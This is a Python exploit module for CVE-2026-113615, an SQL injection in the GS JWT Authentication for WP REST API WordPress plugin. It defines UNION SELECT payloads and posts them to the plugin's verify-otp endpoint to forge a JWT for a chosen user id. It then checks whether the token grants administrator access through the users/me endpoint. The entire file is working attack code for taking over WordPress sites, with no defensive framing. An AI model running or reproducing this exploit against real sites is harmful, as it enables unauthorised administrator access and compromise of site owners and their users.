#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-113615 GS JWT Authentication for WP REST API SQLi helpers."""

from __future__ import annotations

import json
from typing import Any, Callable, Dict, List, Optional, Tuple

GS_JWT_NAMESPACE = "gs-jwt/v1"
VERIFY_OTP_ROUTE = "/gs-jwt/v1/verify-otp"
USERS_ME_ROUTE = "/wp/v2/users/me"

SQLI_PAYLOADS = (
    "x' UNION SELECT {uid},'m'-- -",
    "x' UNION SELECT {uid},'m'#",
    "x' UNION SELECT {uid},'m' -- -",
)


def gs_jwt_sqli_payloads(uid: int) -> List[str]:
    uid = int(uid or 1)
    return [tpl.format(uid=uid) for tpl in SQLI_PAYLOADS]


def extract_gs_jwt_token(body: str) -> str:
    try:
        data = json.loads(body or "{}")
    except (TypeError, ValueError):
        return ""
    if not isinstance(data, dict):
        return ""
    block = data.get("data") or {}
    if isinstance(block, dict):
        token = block.get("token")
        if token:
            return str(token)
    return ""


def forge_gs_jwt_token(
    http_post_json: Callable[..., Any],
    *,
    uid: int = 1,
) -> Dict[str, Any]:
    """
    ``http_post_json(route, json_body)`` -> response with .status_code and .text
    """
    out: Dict[str, Any] = {
        "token": "",
        "uid": int(uid),
        "status": 0,
        "error": "",
    }
    route = VERIFY_OTP_ROUTE
    for injection in gs_jwt_sqli_payloads(uid):
        try:
            response = http_post_json(
                route,
                {"otp": injection, "mobile": "x"},
            )
        except Exception as exc:
            out["error"] = str(exc)[:200]
            return out
        if not response:
            continue
        out["status"] = int(getattr(response, "status_code", 0) or 0)
        token = extract_gs_jwt_token(getattr(response, "text", "") or "")
        if token:
            out["token"] = token
            return out
    if not out["error"]:
        out["error"] = "no_token"
    return out


def verify_gs_jwt_admin(
    http_get: Callable[..., Any],
    token: str,
) -> Tuple[bool, Dict[str, Any]]:
    """GET /wp/v2/users/me?context=edit with Bearer token."""
    try:
        response = http_get(
            f"{USERS_ME_ROUTE}?context=edit",
            headers={"Authorization": f"Bearer {token}"},
        )
    except Exception:
        return False, {}
    if not response or int(getattr(response, "status_code", 0) or 0) != 200:
        return False, {}
    try:
        profile = json.loads(getattr(response, "text", "") or "{}")
    except (TypeError, ValueError):
        return False, {}
    if not isinstance(profile, dict):
        return False, {}
    roles = profile.get("roles") or []
    return "administrator" in roles, profile
